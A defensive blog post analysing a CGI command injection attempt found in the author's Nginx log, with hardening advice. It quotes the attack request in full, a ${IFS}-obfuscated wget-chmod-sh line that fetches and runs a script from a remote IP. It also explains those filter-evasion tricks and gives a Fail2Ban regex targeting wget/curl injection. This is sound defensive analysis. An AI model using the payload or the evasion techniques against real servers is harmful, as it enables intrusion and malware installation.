---
slug: cgi-injection-log-analysis
title: A Technical Profile of CGI Attacks
authors: Z. Yuan
image: /en/img/2025/0430.jpg
tags: [security, fail2ban, ufw, log-analysis]
description: An analysis of CGI command injection attacks.
---

My server was attacked again.

Every day, it seems, the world is full of malice.

<!-- truncate -->

## What is CGI?

Common Gateway Interface (CGI) is an ancient protocol that dates back to 1993. Back then, static webpages were the norm, and CGI was seen as a magical solution for creating "dynamic content."

Its operation is simple and crude:

1. The browser sends an HTTP request.
2. The web server recognizes the path `/cgi-bin/` and knows it needs to "do something."
3. It places the Query String, Header, and other information into environment variables.
4. Then, it forks an external program (like Perl, Bash, or C) to directly handle those variables.
5. The program outputs an HTTP response via STDOUT.
6. The process ends, and waits for the next request to spawn a new one.

The advantage is its universality: any language can be used, as long as it can run on the OS.

The disadvantages, however, are plentiful:

- One request spawns one process, leading to poor performance and high server load.
- Environment variables are unprotected and vulnerable to command injection.
- Executables are placed in public paths, essentially exposing them.
- Process permissions are the same as the web server’s; with a simple mistake, an attacker can take over.

Today, CGI has been replaced by more secure and efficient systems like PHP-FPM, FastCGI, and WSGI.

However, it still survives in some legacy systems and has become a hunting ground for attackers.

## Signs of Attack

While routinely checking Nginx’s error log, I found the following anomaly:

```log
2025-04-28 14:21:36,297 fail2ban.filter [1723]: WARNING Consider setting logencoding…

b'2025/04/28 14:21:36 [error] 2464#2464: *7393

open() "/usr/share/nginx/html/cgi-bin/mainfunction.cgi/apmcfgupload"
failed (2: No such file or directory),

client: 176.65.148.10,
request: "GET /cgi-bin/mainfunction.cgi/apmcfgupload?session=xxx…0\xb4%52$c%52$ccd${IFS}/dev;wget${IFS}http://94.26.90.205/wget.sh;${IFS}chmod${IFS}+x${IFS}wget.sh;sh${IFS}wget.sh HTTP/1.1",
referrer: "http://xxx.xxx.xxx.xxx:80/cgi-bin/…"\n'
```

Pay attention to this line:

```log
wget${IFS}http://94.26.90.205/wget.sh;
```

This is not a typo but **blatant command injection**.

The attacker uses the CGI parameter field to try and execute the following steps:

1. Download `wget.sh`.
2. Grant execution permissions.
3. Immediately execute the script.

These malicious scripts come in various forms, with common behaviors including:

- Adding backdoor accounts, implanting SSH Keys.
- Dropping mining programs (such as `xmrig` or `kdevtmpfs`).
- Modifying crontab to ensure the script reactivates upon reboot.
- Disabling firewalls and security monitoring.

Once compromised, your server could be working harder than you, with the profits flowing into someone else’s pocket.

## Breakdown of the Attack Method

These attacks generally follow these steps:

- **Scanning**: `GET /cgi-bin/*.cgi` — Randomly probing to find alive CGI scripts.
- **Injection**: Using techniques like `%52$c` and `${IFS}` to bypass input filtering and string matching.
- **Downloading**: `wget http://...` to fetch the malicious script, often hosted on bare machines or compromised servers.
- **Execution**: `chmod +x && sh` — Relaxing permissions, executing the script immediately, all in one go.

Here are two common techniques used:

- `%52$c`: A `printf` formatting trick originally designed to operate on the stack. While it doesn’t trigger overflow in this case, it bypasses basic keyword matching filters.
- `${IFS}`: The Internal Field Separator in Bash, which by default is a space. By writing a space as `${IFS}`, attackers can evade filters that only target spaces.

## Defense Strategies

No defense is foolproof, but you can make it harder for attackers to succeed by forcing them to take longer, more indirect paths, thus significantly reducing the risks.

### 1. Disable CGI Modules

```bash
# Apache example
sudo a2dismod cgi
sudo a2dismod php7.4

# Nginx does not natively support CGI, avoid installing fcgiwrap
```

### 2. Configure Notification Mechanism

```bash title="/etc/fail2ban/filter.d/nginx-cgi.conf"
[Definition]
failregex = <HOST> -.*GET .*cgi-bin.*(;wget|curl).*HTTP
ignoreregex =
```

```ini title="/etc/fail2ban/jail.d/nginx-cgi.local"
[nginx-cgi]
enabled  = true
port     = http,https
filter   = nginx-cgi
logpath  = /var/log/nginx/error.log
maxretry = 3
bantime  = 6h
action   = %(action_mwl)s   # Includes email notification + whois query + log summary
```

### 3. Basic Firewall Configuration

```bash
sudo ufw default deny incoming
sudo ufw allow 22/tcp comment 'SSH'
sudo ufw allow 80,443/tcp comment 'Web'
sudo ufw enable
```

Don't forget to configure limits for IPv6 as well.

### 4. System Monitoring

| Feature                              | Tool Name                | Installation Method          |
| ------------------------------------ | ------------------------ | ---------------------------- |
| Real-time Monitoring & Alerts        | **Netdata**              | `apt install netdata`        |
| Log Analysis & Traffic Visualization | **GoAccess**             | `apt install goaccess`       |
| SOC Defense Framework                | **Wazuh** / **CrowdSec** | Official installation script |

- **CrowdSec**: An evolution of Fail2Ban, with community blacklists and firewall-bouncer plugins.
- **Wazuh**: An enhanced version of OSSEC, integrated with the Elastic Stack for a full visual dashboard.

## Conclusion

Not finding any anomalies doesn't mean you're safe.

Only by establishing observation baselines and regularly reviewing logs can you detect and handle issues as soon as they arise.

This time, the CGI attack "failed," not because the attacker was inept, but because I took a few extra steps: disabled modules, set up firewalls, and configured Fail2Ban.

> **The essence of cybersecurity is never about "Are you the target?" but rather, "Are you exposed to risk?"**

From the moment you connect to the internet, every machine silently participates in a global scanning lottery. To avoid "winning" the lottery, you can’t just rely on luck — you need daily preparation and vigilance.

This time, the unwelcome guest came from afar. I happened to be awake, and I had locked the door.

I hope you are too.
